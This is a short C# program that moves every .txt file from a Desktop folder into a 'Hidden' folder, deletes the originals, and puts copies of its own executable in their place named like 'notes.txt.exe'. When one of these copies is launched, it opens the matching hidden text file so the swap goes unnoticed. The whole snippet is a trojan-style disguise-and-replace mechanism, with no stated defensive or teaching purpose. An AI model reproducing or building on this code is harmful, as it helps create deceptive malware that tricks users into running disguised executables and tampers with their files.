static void Main(string[] args)
{

    var DesktopLoc = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

    var pathToOriginal = Path.Combine(DesktopLoc, "Original");
    var pathToHidden = Path.Combine(DesktopLoc, "Hidden");

    List<string> Files = new List<string>(Directory.GetFiles(pathToOriginal));
    List<string> TxTFiles = new List<string>();

    for (int i = 0; i < Files.Count; i++) {
        if (Files[i].EndsWith(".txt")) {
            TxTFiles.Add(Files[i]);
        }
    }

    var exeName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");

    foreach (var item in TxTFiles)
    {
        var Name = Path.GetFileName(item);
        var _Path = Path.GetDirectoryName(item);
        File.Copy(item, Path.Combine(pathToHidden, Name), true);
        File.Delete(item);
        File.Copy(exeName, Path.Combine(_Path, Name + ".exe"));
    }

    var findTxt = Path.GetFileName(exeName);
    findTxt = findTxt.Replace(".exe", "");
    var exePath = Path.Combine(pathToHidden, findTxt);

    if (File.Exists(exePath))
        Process.Start(exePath);
}
